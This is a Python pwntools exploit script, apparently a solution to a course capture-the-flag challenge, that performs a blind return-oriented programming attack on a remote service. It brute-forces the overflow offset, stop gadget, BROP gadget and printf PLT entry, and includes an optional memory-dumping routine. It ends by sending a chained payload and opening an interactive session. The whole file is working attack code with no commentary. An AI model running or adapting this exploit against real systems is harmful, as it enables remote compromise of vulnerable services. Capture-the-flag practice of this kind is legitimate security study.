from pwn import *

OFFSET_MIN = 1
OFFSET_MAX = 100

STOP_MIN = 0x401080
STOP_MAX = 0x401180

BROP_MIN = 0x401462
BROP_MAX = 0x401562

PLT_MIN = 0x401020
PLT_MAX = 0x401120

BLAST_OFF = 0x404020

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin9.chals.io", 443, ssl=True, sni="cse4850-bin9.chals.io")
    return process(e.path)

def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info(f"Trying offset of {i}")
        with context.quiet:
            p = start()
            payload = cyclic(i)
            p.sendlineafter(b'start:', payload)
            try:
                p.recvuntil(b'The falcon 9', timeout=1)
            except EOFError:
                p.close()
                return i//8 * 8
            p.close()

def find_stop(offset):
    for i in range(STOP_MIN, STOP_MAX):
        log.info(f"Checking for stop gadget at {hex(i)}")
        with context.quiet:
            p = start()
            payload = cyclic(offset)
            payload += p64(i)
            payload += p64(i+1)
            p.sendlineafter(b'start:', payload)
            try:
                s = p.recvuntil(b'It\'s 3 2 1', timeout=1)
                if s == b"":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()

def find_brop(offset, stop):
    for i in range(BROP_MIN, BROP_MAX):
        log.info(f"Checking for brop gadget at {hex(i)}")
        with context.quiet:
            p = start()
            payload = cyclic(offset)
            payload += p64(i)
            for j in range(6):
                payload += p64(0xdeadbeef)
            payload += p64(stop)
            payload += p64(stop+1)
            p.sendlineafter(b'start:', payload)
            try:
                s = p.recvuntil(b"It's 3 2 1", timeout=1)
                if s == b"":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()

def find_printf_plt(offset, stop_addr, brop_addr):
    pop_rdi = brop_addr + 9
    for i in range(PLT_MIN, PLT_MAX):
        log.info(f"Checking for printf plt at {hex(i)}")
        with context.quiet:
            p = start()
            payload = cyclic(offset)
            payload += p64(pop_rdi)
            payload += p64(i)
            payload += p64(i)
            p.sendlineafter(b'start:', payload)
            try:
                s = p.recvline()
                if b'\xff' in s:
                    p.close()
                    return i
                p.close()
            except EOFError:
                p.close()

def map_blast_off(offset, stop_addr, brop_addr, printf_addr):
    pop_rdi = brop_addr + 9
    data = b''
    for i in range(0x100):
        log.info(f"Mapping the {i}th address of Blast Off")
        with context.quiet:
            p = start()
            payload = cyclic(offset)
            payload += p64(pop_rdi)
            payload += p64(BLAST_OFF)
            payload += p64(printf_addr + 16)
            payload += p64(stop_addr)
            p.sendlineafter(b'start:', payload)
            s = p.recvline()
            addr = u64(s[1:-1] + b'\0'*(8 - len(s[1:-1])))

            payload = cyclic(offset)
            payload += p64(pop_rdi)
            payload += p64(addr + i)
            payload += p64(printf_addr + 16)
            payload += p64(stop_addr)
            p.sendlineafter(b'start:', payload)
            try:
                s = p.recvline()
                if len(s) <= 2:
                    data += b'\0'
                else:
                    data += s[1:2]
                p.close()
            except EOFError:
                i -= 1
                p.close()
    return data

def pwn(offset, stop_addr, brop_addr, printf_addr):
    with context.quiet:
        p = start()
        payload = cyclic(offset)
        payload += p64(brop_addr + 10)
        payload += p64(brop_addr)
        payload += p64(0x0)
        payload += p64(0x0)
        payload += p64(0x3)
        payload += p64(0x2)
        payload += p64(0x1)
        payload += p64(BLAST_OFF)
        payload += p64(brop_addr - 0x1a)
        p.sendlineafter(b'start:', payload)
        p.interactive()

offset = find_offset()
log.info(f"Found offset of {offset}")
pause()

stop_addr = find_stop(offset)
log.info(f"Found stop gadget at {hex(stop_addr)}")
pause()

brop_addr = find_brop(offset, stop_addr)
log.info(f"Found brop gadget at {hex(brop_addr)}")
pause()

printf_plt = find_printf_plt(offset, stop_addr, brop_addr)
log.info(f"Found printf plt at {hex(printf_plt)}")
pause()

# data = map_blast_off(offset, stop_addr, brop_addr, printf_plt)
# print(data)

pwn(offset, stop_addr, brop_addr, printf_plt)